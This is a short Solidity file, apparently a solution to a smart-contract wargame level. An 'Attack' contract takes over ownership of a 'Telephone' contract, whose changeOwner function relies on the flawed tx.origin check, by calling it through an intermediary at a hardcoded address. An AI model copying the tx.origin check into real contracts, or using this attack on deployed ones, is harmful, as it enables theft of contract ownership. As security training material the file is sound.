// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack{
    Telephone tp = Telephone(0xee10F5d57a041B2EF88bDafaE6C5eA9AE27C51C1);

    function callChangeOwner() public{
        tp.changeOwner(msg.sender);
    }
}

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}